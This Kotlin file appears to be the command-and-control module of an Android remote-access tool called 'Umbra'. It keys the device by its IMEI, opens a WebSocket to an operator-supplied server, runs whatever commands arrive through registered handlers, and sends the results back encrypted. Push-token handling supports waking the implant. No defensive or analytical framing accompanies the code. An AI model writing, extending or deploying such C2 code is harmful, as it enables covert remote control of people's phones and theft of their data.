package dev.yassine.umbra.c2

import android.content.Context
import android.util.Log
import dev.yassine.umbra.core.CryptoEngine
import kotlinx.coroutines.*

object C2Coordinator {
    private const val TAG = "Umbra.C2"

    private var ws: WebSocketTransport? = null
    private var fcmToken: String? = null
    private var c2BaseUrl: String = ""
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String = ""

    fun start(
        context: Context,
        imei: String,
        serverUrl: String,
        token: String?,
        handlers: Map<String, suspend (Command) -> String>
    ) {
        deviceId = imei
        fcmToken = token
        c2BaseUrl = serverUrl

        CommandDispatcher.register(handlers)

        ws = WebSocketTransport(
            serverUrl = serverUrl,
            onCommand = { cmd ->
                runBlocking {
                    val raw = CommandDispatcher.dispatch(
                        kotlinx.serialization.json.Json { ignoreUnknownKeys = true }
                            .encodeToString(Command.serializer(), cmd)
                    )
                    CryptoEngine.encrypt(raw)
                }
            },
            onStatus = { status -> Log.d(TAG, "WS: $status") }
        ).also { it.connect(imei) }
    }

    fun stop() {
        scope.cancel()
        ws?.disconnect()
    }

    fun updateFcmToken(token: String) {
        fcmToken = token
    }

    fun sendResult(payload: String) {
        ws?.send(CryptoEngine.encrypt(payload))
    }

    fun isConnected(): Boolean = ws?.isConnected() == true
}
